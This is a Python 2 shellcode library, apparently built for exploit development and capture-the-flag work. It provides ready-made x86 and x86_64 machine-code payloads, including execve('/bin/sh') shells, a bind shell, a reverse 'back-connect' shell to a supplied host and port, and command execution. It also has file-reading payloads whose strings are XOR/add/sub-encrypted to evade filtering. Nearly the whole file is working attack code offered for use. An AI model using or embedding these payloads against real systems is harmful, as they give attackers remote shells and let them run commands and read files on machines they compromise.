#!/usr/bin/python
from __future__ import print_function
from struct import *
from ctypes import *
from capstone import *
import os
# a collection of shellcode use regulary on exploit code.

NOPs_X86 = '\x90'

def xor_str(msg,key):
	enc = []

	for i,c in enumerate(msg):
		enc.append(chr(ord(c) ^ ord(key[i % len(key)])))
	return ''.join(enc)

def stoh(host):
	byte_s = ''
	if host.count('.') == 3:
		for p in host.split('.'):
			byte_s += chr(int(p))
	return byte_s

def gen_key_pair(length,size_of_key):
	key = []
	for i in xrange(length):
		tmp = os.urandom(size_of_key) # urandom size of each key
		while '\x00' in tmp: # random key until '\x00' not in key
			tmp = os.urandom(size_of_key)
		key.append(tmp)
	return key

# ultilities function
def num_add(v1,v2,mode):
	uint = c_uint64 if mode else c_uint32
	return uint(v1 + v2).value

def num_sub(v1,v2,mode):
	uint = c_uint64 if mode else c_uint32
	return uint(v1 - v2).value

def num_xor(v1,v2,mode):
	uint = c_uint64 if mode else c_uint32
	return uint(v1 ^ v2).value

def _unpack(v,mode):
	if mode:
		return unpack('<Q',v)[0]
	else:
		return unpack('<I',v)[0]

def _pack(v,mode):
	if mode:
		return pack('<Q',v)
	else:
		return pack('<I',v)

def add_str(msg,key,mode = 0):
	enc = []

	# init offset
	off = 8 if mode else 4

	# padding message is multiple of 4 or 8
	while len(msg) % off:
		msg += os.urandom(1)

	key = _unpack(key,mode)
	for i in xrange(0,len(msg),off):
		v = _unpack(msg[i:i+off],mode)
		v1 = num_add(v,key,mode)
		enc.append(_pack(v1,mode))

	return ''.join(enc)

def sub_str(msg,key,mode = 0):
	enc = []

	# init offset
	off = 8 if mode else 4

	# padding message is multiple of 4 or 8
	while len(msg) % off:
		msg += os.urandom(1)

	key = _unpack(key,mode)
	for i in xrange(0,len(msg),off):
		v = _unpack(msg[i:i+off],mode)
		v1 = num_sub(v,key,mode)
		enc.append(_pack(v1,mode))

	return ''.join(enc)

def decrypt(cipher,key,step_funcs,mode = 0):
	# init off
	off = 8 if mode else 4

	while len(cipher) % off:
		cipher += '\x00'

	msg = ''
	key = _unpack(key,mode)

	for i in xrange(0,len(cipher),off):
		v = _unpack(cipher[i:i+off],mode)
		for func in step_funcs:
			v = func(v,key,mode)
		msg += _pack(v,mode)

	return msg

class Shellcode(str):
	mode = 0

	def __new__(cls,content,mode = 0):
		obj = super(Shellcode,cls).__new__(cls,content)
		if isinstance(mode,int):
			obj.mode = mode
		else:
			raise Exception('Invalid Mode Setting')
		return obj

	# support disassembly feature
	def disas(self):
		md = None
		if self.mode:
			md = Cs(CS_ARCH_X86, CS_MODE_64)
		else:
			md = Cs(CS_ARCH_X86, CS_MODE_32)

		if not md:
			raise Exception('Unsupported Arch')
		else:
			for (address, size, mnemonic, op_str) in md.disasm_lite(str.__str__(self), 0x1000):	
				print("0x%x:\t%s\t%s" % (address, mnemonic, op_str))

	# concentraction two Shellcode
	def __add__(self,obj):
		# if current shellcode mode was different from obj shellcode
		# it will raise exeception.

		# add 2 Shellcode
		if type(obj) is Shellcode:
			# check architecture mode
			if obj.mode == self.mode:
				return Shellcode(str.__str__(self) + obj.__str__(),self.mode)
			else:
				raise Exception('Difference Architecture Mode')
		# add Shellcode with string
		elif type(obj) is str:
			return Shellcode(str.__str__(self) + obj,self.mode)
		else:
			raise Exception('Invalid Type: obj must be a string or Shellcode')

	# def __radd__(self):
	# 	pass

	# += method
	def __iadd__(self,obj):
		# if current shellcode mode was different from obj shellcode
		# it will raise exeception.
		if type(obj) is Shellcode:
			# check mode of 2 objs, there objs must be the same
			if obj.mode == self.mode:
				self = self + obj.__str__()
				return self
			else:
				raise Exception('Difference Architecture Mode')
		elif type(obj) is str:
			self = self + obj
			return self
		else:
			raise Exception('Invalid Type: obj must be a string or Shellcode')

	def __str__(self):
		return str.__str__(self)
 
class x86:
	def dupsSock(self,fd=4):
		dups = "\x31\xc9\x6a" + pack('<B',fd) + "\x5b\x6a\x3f\x58\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf4"
		return Shellcode(dups)

	def execveShell(self):
		execve = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
		return Shellcode(execve)

	def execveShellBypassScanf(self):
		# execve('/bin/sh') # use for scanf("%s")
		execve = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70"
		execve+= "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f"
		execve+= "\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
		return Shellcode(execve)

	def dupsExecve(self,fd=4):
		# reuse socket fd and execve()
		return self.dupsSock(fd) + NOPs_X86*10 + self.execveShell()

	def bindShell(self,port):
		bindshell = "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
		bindshell+= "\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
		bindshell+= "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
		bindshell+= "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
		bindshell+= "\x89\xe3\x31\xc9\xcd\x80"
		return Shellcode(bindshell)

	def backconnectShell(self,host,port):
		if stoh(host) == '':
			raise Exception('Invalid Host')

		if not isinstance(port,int):
			raise Exception('Invalid Port')

		backconnect = "\x68"
		backconnect+= stoh(host) #// <- IP Number "127.1.1.1"
		backconnect+= "\x5e\x66\x68"
		backconnect+= pack('>I',port)[2:]   #// <- Port Number "55555"
		backconnect+= "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
		backconnect+= "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
		backconnect+= "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
		backconnect+= "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
		backconnect+= "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
		backconnect+= "\xeb\xce"
		return Shellcode(backconnect)

	def read_flag_enc(self,filepath):
		key = gen_key_pair(3,4)

		read_flag = 'hDDDDhAAAAhBBBB^_]T[j Y\xc1\xe1\x08)\xcbS\xeb\x04\x8b\x1c$\xc3\xe8'
		read_flag+= '\xf7\xff\xff\xff\x83\xc3MS1\xc9AA\xc1\xe1\x061+\x83\xc3\x04\x83\xe9'
		read_flag+= '\x04\x85\xc9u\xf4[j\x05X1\xc91\xd2\xcd\x80Pj\x03X[Yj\x01Z\xc1\xe2\x08'
		read_flag+= '\xcd\x80QQ[RY13\x83\xc3\x041;\x83\xc3\x04\x83\xe9\x08\x85\xc9u\xefj\x04'
		read_flag+= 'XY1\xdb\xcd\x80concat'

		filepath += '\x00'

		read_flag = read_flag.replace('AAAA',key[0])
		read_flag = read_flag.replace('BBBB',key[1])
		read_flag = read_flag.replace('DDDD',key[2])
		read_flag = read_flag.replace('concat',xor_str(filepath,key[2]))

		return Shellcode(read_flag),key[1]+key[0]

	def read_flag_enc_2(self,filepath):
		# generate key
		keys = gen_key_pair(3,4) # gen 3 keys with 4 bytes for each key

		key_fn_enc = keys[2]
		key_flag_enc = xor_str(keys[0],keys[1])

		enc_fn_steps = {
			'\x31\x2b' : xor_str, # xor
			'\x01\x2b' : sub_str, # add
			'\x29\x2b' : add_str, # sub
		}

		enc_flag_steps = {
			'\x31\x37\x01\x37\x01\x37' : [num_sub,num_sub,num_xor], # xor add add
			'\x01\x37\x01\x37\x31\x37' : [num_xor,num_sub,num_sub], # add add xor
			'\x01\x37\x31\x37\x01\x37' : [num_sub,num_xor,num_sub], # add xor add
			'\x31\x37\x29\x37\x29\x37' : [num_add,num_add,num_xor], # xor sub sub
			'\x29\x37\x29\x37\x31\x37' : [num_xor,num_add,num_add], # sub sub xor
			'\x29\x37\x31\x37\x29\x37' : [num_add,num_xor,num_add]  # sub xor sub
		}

		sc = 'hCCCChAAAAhBBBB^_]1\xfe1\xc0\x83\xc0\x10\xc1\xe0\x08)\xc4\xeb\x04\x8b\x1c$'
		sc+= '\xc3\xe8\xf7\xff\xff\xff\x83\xc3NS1\xc9\x83\xc1\x10\xc1\xe1\x041+\x83\xc3\x04'
		sc+= '\x83\xe9\x04\x85\xc9u\xf4[1\xc9j\x05X\xcd\x80P[\x83\xc1\x10\xc1\xe1\x04QZTYj\x03X'
		sc+= '\xcd\x80QQ_RY17\x017)7\x83\xc7\x04\x83\xe9\x04\x85\xc9u\xf01\xdbYj\x04X\xcd\x80concat'
		
		# modify original shellcode
		enc_fn = enc_fn_steps.keys()[ord(os.urandom(1)) % len(enc_fn_steps)]
		sc = sc.replace('AAAA',keys[0])
		sc = sc.replace('BBBB',keys[1])
		sc = sc.replace('CCCC',keys[2])
		sc = sc.replace('\x31\x2b',enc_fn)
		sc = sc.replace('concat',enc_fn_steps[enc_fn](filepath + '\x00',key_fn_enc))

		enc_order = enc_flag_steps.keys()[ord(os.urandom(1)) % len(enc_flag_steps)]
		sc = sc.replace('\x31\x37\x01\x37\x29\x37',enc_order)

		return Shellcode(sc),key_flag_enc,enc_flag_steps[enc_order]

	def exec_enc_command(self,command):
		'''
			Execute encrypted command
		'''

		key = gen_key_pair(3,4)

		sc = '\xeb\x04\x8b\x1c$\xc31\xc9AA\xc1\xe1\x0c)\xcchAAAAhBBBB^_'
		sc+= '\xe8\xe2\xff\xff\xff\x83\xc3[S1\xc9A\xc1\xe1\x081;\x83\xc3'
		sc+= '\x0413\x83\xc3\x04\x83\xe9\x08\x85\xc9u\xef^hRRRRhPPPPhQQQ'
		sc+= 'QhCCCCX[_]1\xc31\xc71\xc51\xc0PWSTXP[1\xffWUTX1\xd2RVPS_\x83'
		sc+= '\xc7\x06WTYj\x0bX\xcd\x80ls'

		sc = sc.replace('AAAA',key[0])
		sc = sc.replace('BBBB',key[1])
		sc = sc.replace('CCCC',key[2])
		sc = sc.replace('PPPP',xor_str('//sh',key[2]))
		sc = sc.replace('QQQQ',xor_str('/bin',key[2]))
		sc = sc.replace('RRRR',xor_str('-c\x00\x00',key[2]))

		command += '\x00'
		sc = sc.replace('ls',xor_str(command,key[0] + key[1]))

		return Shellcode(sc)

	def exec_command(self,command):
		sc = '1\xd2Rh//shh/binT[h\rC  X5    PT^SY\x83\xc1\x06R\xeb\x04\x8b<$\xc3\xe8\xf7\xff\xff\xff\x83\xc7'
		sc+= '\rWVQTYj\x0bX\xcd\x80ls'

		sc = sc.replace('ls',command + ';')
		return Shellcode(sc)

	def alloca_stack(self):
		return Shellcode('j\x01Y\xc1\xe1\x0b)\xcc')

	def jmp(self,offset):
		offset = offset & 0xff
		return Shellcode('\xeb' + chr(offset))

class x86_64:
	def dupsSock(self,fd=4):
		dups = "\x48\x31\xf6\x6a" + pack('<B',fd) + "\x5f\x6a\x21\x58\x0f\x05\x40\xfe\xc6\x40\x80\xfe\x03\x75\xf2"
		return Shellcode(dups,1)

	def execveShell(self):
		execve = "\xeb\x1d\x5b\x31\xc0\x67\x89\x43\x07\x67\x89\x5b\x08\x67\x89\x43\x0c"
		execve+= "\x31\xc0\xb0\x0b\x67\x8d\x4b\x08\x67\x8d\x53\x0c\xcd\x80\xe8\xde\xff"
		execve+= "\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x4e\x41\x41\x41\x41\x42\x42\x42"
		execve+= "\x42"
		return Shellcode(execve,1)

	def execveSmallShell(self):
		execve = "\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f"
		execve+= "\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57"
		execve+= "\x54\x5f\x6a\x3b\x58\x0f\x05"
		return Shellcode(execve,1)

	def dupsExecve(self,fd=4):
		return self.dupsSock(fd) + NOPs_X86*10 + self.execveSmallShell()

	def jmp(self,offset):
		offset = offset & 0xff
		return Shellcode('\xeb' + chr(offset),1)

	def read_flag_enc(self,filepath):
		key = gen_key_pair(4,4)

		read_flag = 'hPPPPhAAAAhCCCChBBBBAXAYAZA_AQA\\M1\xc4M1\xd4j\x02YH\xc1\xe1\x08'
		read_flag+= 'H\xc1\xe1\x04T[H)\xcbS\xeb\x05H\x8b\x1c$\xc3\xe8\xf6\xff\xff\xff'
		read_flag+= 'H\x83\xc3nSH1\xc0j\x02XH\xc1\xe0\x06D1;H\x83\xc3\x04H\x83\xe8\x04'
		read_flag+= 'H\x85\xc0u\xf0_H1\xf6j\x02X\x0f\x05P_^H1\xd2H\xff\xc2H\xc1\xe2\x08'
		read_flag+= 'H1\xc0\x0f\x05V[RYD1\x03H\x83\xc3\x04D1\x13H\x83\xc3\x04D1\x0bH\x83'
		read_flag+= '\xc3\x04D1#H\x83\xc3\x04H\x83\xe9\x10H\x85\xc9u\xdbH1\xc0H\xff\xc0'
		read_flag+= 'H1\xff\x0f\x05concat'

		filepath += '\x00'

		read_flag = read_flag.replace('AAAA',key[2])
		read_flag = read_flag.replace('CCCC',key[1])
		read_flag = read_flag.replace('BBBB',key[0])
		read_flag = read_flag.replace('PPPP',key[3])
		read_flag = read_flag.replace('concat',xor_str(filepath,key[3]))

		return Shellcode(read_flag,1),key[0] + key[2] + key[1] + xor_str(xor_str(key[1],key[2]),key[0])

	def read_flag_enc_2(self,filepath):
		# generate keys
		keys = gen_key_pair(4,4) # gen 4 keys with size is 4 bytes long

		sc = 'hPPPPhAAAAhCCCChBBBBAXAYAZA_I\xc1\xe1 I\xc1\xe0 I\xc1\xe8 M\t\xc1I\xc1\xe7 I\xc1\xe2 I'
		sc+= '\xc1\xea M\t\xd7H1\xc0H\x83\xc0\x10H\xc1\xe0\x08H)\xc4\xeb\x05H\x8b\x1c$\xc3\xe8\xf6\xff'
		sc+= '\xff\xffH\x83\xc3bS_H1\xc9H\x83\xc1\x10H\xc1\xe1\x04L1;H\x83\xc3\x08H\x83\xe9\x08H\x85\xc9'
		sc+= 'u\xf0H1\xf6j\x02X\x0f\x05P_T^H1\xd2H\x83\xc2\x10H\xc1\xe2\x04H1\xc0\x0f\x05V[RYL1\x0bL\x01'
		sc+= '\x0bL)\x0bH\x83\xc3\x08H\x83\xe9\x08H\x85\xc9u\xeaH1\xffH1\xc0H\xff\xc0\x0f\x05concat'

		key_fn_enc = keys[2] + keys[3]
		key_flag_enc = keys[1] + keys[0]

		enc_flag_steps = {
			'\x4c\x31\x0b\x4c\x01\x0b\x4c\x01\x0b':[num_sub,num_sub,num_xor], # xor add add
			'\x4c\x01\x0b\x4c\x01\x0b\x4c\x31\x0b':[num_xor,num_sub,num_sub], # add add xor
			'\x4c\x01\x0b\x4c\x31\x0b\x4c\x01\x0b':[num_sub,num_xor,num_sub], # add xor add
			'\x4c\x31\x0b\x4c\x29\x0b\x4c\x29\x0b':[num_add,num_add,num_xor], # xor sub sub
			'\x4c\x29\x0b\x4c\x29\x0b\x4c\x31\x0b':[num_xor,num_add,num_add], # sub sub xor
			'\x4c\x29\x0b\x4c\x31\x0b\x4c\x29\x0b':[num_add,num_xor,num_add], # sub xor sub
		}

		enc_fn_steps = {
			'\x4c\x31\x3b' : xor_str, # xor
			'\x4c\x01\x3b' : sub_str, # add
			'\x4c\x29\x3b' : add_str, # sub
		}

		# replace original shellcode
		enc_fn = enc_fn_steps.keys()[ord(os.urandom(1)) % len(enc_fn_steps)]
		sc = sc.replace('\x4c\x31\x3b',enc_fn)
		sc = sc.replace('PPPP',keys[3])
		sc = sc.replace('AAAA',keys[2])
		sc = sc.replace('BBBB',keys[1])
		sc = sc.replace('CCCC',keys[0])
		sc = sc.replace('concat',enc_fn_steps[enc_fn](filepath + '\x00',key_fn_enc,1))

		enc_order = enc_flag_steps.keys()[ord(os.urandom(1)) % len(enc_flag_steps)]
		sc = sc.replace('\x4c\x31\x0b\x4c\x01\x0b\x4c\x29\x0b',enc_order)

		return Shellcode(sc,1),key_flag_enc,enc_flag_steps[enc_order]

	def exec_enc_command(self,command):
		'''
			Execute encrypted command
		'''
		key = gen_key_pair(5,4)

		sc = 'j\x02YH\xc1\xe1\x0cH)\xcchAAAAhBBBBhCCCChDDDDAXAYA^A_I\xc1\xe0 I\xc1\xe1 I\xc1'
		sc+= '\xe9 M\t\xc8I\xc1\xe6 I\xc1\xe7 I\xc1\xef M\t\xfej\x01YH\xc1\xe1\x08M1\xf0\xeb'
		sc+= '\x05H\x8b\x1c$\xc3\xe8\xf6\xff\xff\xffH\x83\xc3fSL1\x03H\x83\xc3\x08H\x83\xe9'
		sc+= '\x08H\x85\xc9u\xf0^hPPPPhQQQQhRRRRhSSSSA_A^AYAXM1\xf8M1\xf9M1\xfeM1\xffI\xc1'
		sc+= '\xe0 M\t\xc8AWAPT_AVTZW[H\x83\xc3\x06H1\xc0PVRST^H1\xd2j;X\x0f\x05ls'

		sc = sc.replace('AAAA',key[3])
		sc = sc.replace('BBBB',key[2])
		sc = sc.replace('CCCC',key[1])
		sc = sc.replace('DDDD',key[0])

		sc = sc.replace('PPPP',xor_str('//sh',key[4]))
		sc = sc.replace('QQQQ',xor_str('/bin',key[4]))
		sc = sc.replace('RRRR',xor_str('-c\x00\x00',key[4]))
		sc = sc.replace('SSSS',key[4])

		sc = sc.replace('ls',xor_str(command + '\x00',xor_str(key[1] + key[0],key[3] + key[2])))

		return Shellcode(sc,1)

	def exec_command(self,command):
		sc = 'H1\xd2Rh//shh/binAYAXI\xc1\xe0 M\t\xc8APT_h\rC  XH5    PT^WYH\x83\xc1\x06R\xeb'
		sc+= '\x05H\x8b\x1c$\xc3\xe8\xf6\xff\xff\xffH\x83\xc3\x0eSVQT^j;X\x0f\x05ls'

		sc = sc.replace('ls',command + ';')

		return Shellcode(sc,1)

	def alloca_stack(self):
		return Shellcode('j\x01YH\xc1\xe1\x0bH)\xcc',1)